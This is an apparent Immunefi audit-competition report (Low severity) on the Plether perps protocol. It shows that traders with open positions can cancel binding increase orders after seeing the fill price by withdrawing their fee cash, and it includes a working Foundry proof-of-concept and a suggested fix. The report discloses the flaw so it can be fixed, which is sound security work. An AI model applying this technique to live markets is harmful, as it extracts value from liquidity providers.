# \#98032 [SC-Low] A trader with an open position can drop a pending increase after seeing its fill price by withdrawing the fee cash, turning a "binding" order into a free option against LPs

**Submitted on Nov 4th 2026 at 13:59:34 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98032
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description


# Summary

`SECURITY.md:658-659` lists, as a security property, that "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options." That is false for accounts that already hold a position. An increase that leaves its fee to free cash can be committed, and its fill price, the first Pyth tick after commit, is public before a keeper executes it. If the market then moves against that fill, the trader withdraws the free cash. The withdrawal guard only checks the live position's health, so the withdrawal goes through and the keeper's execution fails instead of filling. If the market moves in the trader's favour, they do nothing and keep the fill. The trader keeps the good outcomes and discards the bad ones after seeing them, which is a free option paid for by LPs, who are the counterparty.

# Description

**1. The fill price is known before execution.** Outside a freeze, a delayed order fills at the first Pyth update after its commit time: the oracle runs `parsePriceFeedUpdatesUnique` over `(commitTime, min(commitTime + orderSettlementWindow, block.timestamp)]` (`ORACLE_SYNCHRONIZATION.md:48-51`). That tick is public on Hermes as soon as it is published, while the keeper's execution lands some time later, up to the order's execution window (60 seconds by default). During that gap the trader knows the fill price and can watch where the market goes next.

**2. The order is meant to be binding, and the docs say so.** Users cannot cancel a queued order (`SECURITY.md:719`), and the docs present this as the protection against free options (`SECURITY.md:658-659`).

**3. A withdrawal can still make the order fail on purpose.** An increase's trade cost (execution fee and VPI) is debited from free settlement at execution, and the open fails with `MARGIN_DRAINED_BY_FEES` if free settlement is short (`MarginClearinghouseAccountingLib.sol:157-162`). Nothing reserves that free cash at commit. The owner withdrawal guard (`CfdEngineSettlementSidecar.sol:255-284`) only checks:
- for a flat account, a positive `minPostSettlementBalanceAssets` floor, which exists only on a flat account's first open (`ACCOUNTING_SPEC.md:917-931`);
- for an account with a position, the position's own health (carry, VPI reserve, price-risk margin).

Neither branch asks whether a pending order still has the cash it needs. So a trader with a live position can withdraw the fee cash at any time before execution, and the keeper's call then terminalizes the order as `PlannerRejected` instead of filling it. The only cost is the open order's execution bounty, at most 0.20 USDG, which goes to the keeper.

**4. This reopens a problem the team already fixed.** The pre-audit's SC-M4, "Risk Free Option in 60Sec Oracle Window", was marked "Fixed in Plether-Fi/plether-core#24". X-01 reaches the same prohibited result, a costless directional option inside the execution window, by a different route.

**5. It is a real look-back, unlike HIGH-1.** The AI audit's HIGH-1, "Trader can close positions at already-known oracle ticks against LPs", was downgraded to Informational because "closing an existing position at a known favorable price can be ordinary trading PnL; the next tick is unknown and could favor either side." That rebuttal does not apply here. In X-01 the trader sees the actual fill, then sees where the market goes after it, and only then decides to keep or discard it. Discarding the bad outcome after seeing it is what makes it an option rather than a trade.

**Limits, stated up front.**
- In the PoC the increase carries zero order margin, so it must fit inside the position's existing liquidation reserve (10 bps of notional, fixed when the position was last changed). An increase that brings its own margin pays its fee from that margin, and withdrawing other cash cannot make it fail. This bounds the proven version to the reserve headroom, a few percent of the position.
- The option only lasts from the fill tick to the keeper's execution. With prompt keepers that is often a few seconds, so in calm FX the edge is usually smaller than the 0.04% fee paid on kept fills. It pays off in fast markets and news spikes, and whenever execution is delayed.
- The spec's withdrawal floor covers only a flat account's first open, and it says "Zero-minimum orders retain ordinary availability" (`ACCOUNTING_SPEC.md:929-930`). That paragraph is about protecting a settlement-minimum bound, not about options, and it does not qualify the separate security property in `SECURITY.md:658-659`.

**Suggested fix.** When an account has pending opens or increases, extend the withdrawal guard so owner withdrawals cannot take free settlement below the pending orders' projected trade cost. Alternatively, reserve each increase's projected cost at commit, the same way order margin is reserved.

# Impact

- The protocol's stated security property, that queued intents cannot be turned into free options, does not hold for traders who already have a position. A trader can keep favourable increase fills and discard unfavourable ones after seeing the market move, paying at most the 0.20 USDG bounty for each discarded order.
- The value comes from LPs, the counterparty to every fill. In the PoC, on a 990 USDG increase and a 0.30% move inside the window, discarding the bad fill avoided a 3.76 USDG loss, and keeping the good one locked in a 2.08 USDG gain.
- The proven size is bounded by liquidation-reserve headroom, and the edge depends on how much the market moves before a keeper executes. It is therefore small and regime-dependent, not a fund drain.

Severity: Low: "Contract fails to deliver promised returns, but doesn't lose value". The binding-order guarantee in `SECURITY.md:658-659` is not delivered. 



## Proof of Concept

## Proof of Concept


File: `packages/perps/test/poc/X01FreeOptionCancel.t.sol` (full code below). It uses the repository's `BasePerpTest` fixture with the release risk parameters from `DEPLOYMENT.md`. The fixture's `_open`/`_close` helpers set up Alice's existing position and measure the final value by closing everything at the post-window price. The attack itself (commit, withdrawal, keeper execution) goes through the public Router and Clearinghouse entrypoints.

Run:

```bash
cd packages/perps
forge test --match-path test/poc/X01FreeOptionCancel.t.sol -vv
```

Setup: Alice holds a 10,000-token LONG opened at 1.0000, and the market is now at 0.9000. In Plether a LONG loses when the basket price rises. She commits a zero-margin increase of 1,100 tokens, and the first post-commit tick, her fill price, is 0.9000. The test then runs four branches from the same snapshot:

- **A. The market moves against her (+0.30% to 0.9027).** She withdraws her free cash before the keeper executes. The order fails (`PlannerRejected`) and her position is unchanged.
- **B. Control: same move, no withdrawal.** The binding order fills at 0.9000 and loses.
- **C. The market moves in her favour (−0.30% to 0.8973).** She does nothing and the fill is kept.
- **D. Reference: same favourable move with no order.**

The asserts check `A > B`, meaning cancelling after seeing the move avoids the loss, and `C > D`, meaning keeping the fill after seeing the move captures the gain.

Output:

```
[PASS] test_X01_TraderKeepsGoodFillsAndCancelsBadOnesAfterSeeingTheTick() (gas: 8155156)
Logs:
  A. Moved against, increase cancelled by withdrawal, final value (USDG 6dp): 1965197819
     order failed, terminal reason: 7
  B. Moved against, binding order filled, final value (USDG 6dp): 1961435194
     loss avoided by cancelling (USDG 6dp): 3762625
  C. Moved in favour, fill kept, final value (USDG 6dp): 2021393194
  D. Moved in favour, no order, final value (USDG 6dp): 2019313568
     gain kept from the favourable fill (USDG 6dp): 2079626
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Terminal reason 7 is `PlannerRejected`. The final values include Alice's earlier profit on the fall from 1.0000 to 0.9000; only the differences between branches matter.

Code:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice PoC for X-01. A trader with a live position commits a zero-margin increase. The fill price is the first
///         Pyth tick after commit, which is public before a keeper executes. If the market then moves against the
///         fill, the trader withdraws the free cash the increase needs for its fee, and the keeper's execution fails
///         instead of filling. If the market moves in favour, the trader does nothing and keeps the fill.
///         SECURITY.md:658-659 says binding orders and the lack of a cancellation path prevent exactly this.
contract X01FreeOptionCancelTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant KEEPER = address(0xE0EC);

    // Prices use 8 decimals. A LONG loses when the basket price rises.
    uint256 internal constant OPEN_PRICE = 100_000_000; // 1.0000, Alice opens here
    uint256 internal constant FILL_TICK = 90_000_000; // 0.9000, mark when Alice commits and first post-commit tick
    uint256 internal constant MOVE_AGAINST = 90_270_000; // 0.9027 (+0.30%): the market moves against the new LONG
    uint256 internal constant MOVE_FOR = 89_730_000; // 0.8973 (-0.30%): the market moves in favour

    uint256 internal constant SIZE = 10_000e18; // existing LONG, 10,000 tokens
    uint256 internal constant MARGIN = 250e6;
    // A zero-margin increase must fit inside the existing liquidation reserve (10 bps of notional, set at the
    // 1.0000 open). At 0.9000 the reserve is 10 USDG against a 9 USDG target, so +1,100 tokens fit (9.99 USDG).
    uint256 internal constant INCREASE = 1_100e18;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _fundTrader(ALICE, 1_000e6);
        _refreshMark(OPEN_PRICE);
        _open(ALICE, CfdTypes.Side.LONG, SIZE, MARGIN, OPEN_PRICE); // Alice already holds a LONG
        _refreshMark(FILL_TICK); // the market has since fallen to 0.9000
    }

    function test_X01_TraderKeepsGoodFillsAndCancelsBadOnesAfterSeeingTheTick() public {
        uint256 snapshot = vm.snapshotState();

        // ---- A. Market moves against the fill: Alice withdraws her free cash, the increase fails. ----
        (uint64 orderId, bytes[] memory fill) = _commitAndPublishFill();
        uint256 withdrawn = clearinghouse.getFreeBuyingPowerAssets(ALICE);
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, withdrawn); // allowed: the guard only checks the live position's health
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory cancelled = router.executeOrder(orderId, fill);
        assertEq(uint8(cancelled.status), uint8(OrderV3Types.LifecycleStatus.Failed), "the bad fill was discarded");
        (uint256 sizeA,,,,,,) = engine.positions(ALICE);
        assertEq(sizeA, SIZE, "position unchanged: the unfavourable increase never happened");
        uint256 valueA = _valueAfterClosingAt(MOVE_AGAINST) + withdrawn;

        // ---- B. Control: same fill and same move, no withdrawal. The binding order fills and loses. ----
        vm.revertToState(snapshot);
        snapshot = vm.snapshotState();
        (orderId, fill) = _commitAndPublishFill();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory forced = router.executeOrder(orderId, fill);
        assertEq(uint8(forced.status), uint8(OrderV3Types.LifecycleStatus.Executed), "without the trick it fills");
        uint256 valueB = _valueAfterClosingAt(MOVE_AGAINST);

        // ---- C. Market moves in favour: Alice does nothing and keeps the fill. ----
        vm.revertToState(snapshot);
        snapshot = vm.snapshotState();
        (orderId, fill) = _commitAndPublishFill();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory kept = router.executeOrder(orderId, fill);
        assertEq(uint8(kept.status), uint8(OrderV3Types.LifecycleStatus.Executed), "the good fill is kept");
        (uint256 sizeC,,,,,,) = engine.positions(ALICE);
        assertEq(sizeC, SIZE + INCREASE, "position increased at the fill tick");
        uint256 valueC = _valueAfterClosingAt(MOVE_FOR);

        // ---- D. Reference: no order at all, same favourable move. ----
        vm.revertToState(snapshot);
        uint256 valueD = _valueAfterClosingAt(MOVE_FOR);

        console2.log("A. Moved against, increase cancelled by withdrawal, final value (USDG 6dp):", valueA);
        console2.log("   order failed, terminal reason:", uint8(cancelled.terminalReason));
        console2.log("B. Moved against, binding order filled, final value (USDG 6dp):", valueB);
        console2.log("   loss avoided by cancelling (USDG 6dp):", valueA - valueB);
        console2.log("C. Moved in favour, fill kept, final value (USDG 6dp):", valueC);
        console2.log("D. Moved in favour, no order, final value (USDG 6dp):", valueD);
        console2.log("   gain kept from the favourable fill (USDG 6dp):", valueC - valueD);

        assertGt(valueA, valueB, "cancelling after seeing the move avoids the loss");
        assertGt(valueC, valueD, "keeping the fill after seeing the move captures the gain");
    }

    // ---- helpers ----

    /// @dev Alice commits a zero-margin increase; the first post-commit tick is published at the current mark.
    function _commitAndPublishFill() internal returns (uint64 orderId, bytes[] memory fill) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = INCREASE;
        request.marginDelta = 0;
        request.targetPrice = 1;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(ALICE);
        orderId = router.commitOrder(request);
        fill = _mockPythUpdateData(FILL_TICK);
    }

    /// @dev Realizes Alice's whole position at `price` and returns her settlement balance.
    function _valueAfterClosingAt(
        uint256 price
    ) internal returns (uint256) {
        _refreshMark(price);
        (uint256 size,,,,,,) = engine.positions(ALICE);
        _close(ALICE, CfdTypes.Side.LONG, size, price);
        return clearinghouse.balanceAssets(ALICE);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        bytes[] memory updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
        router.updateMarkPrice(updateData);
    }

}
```
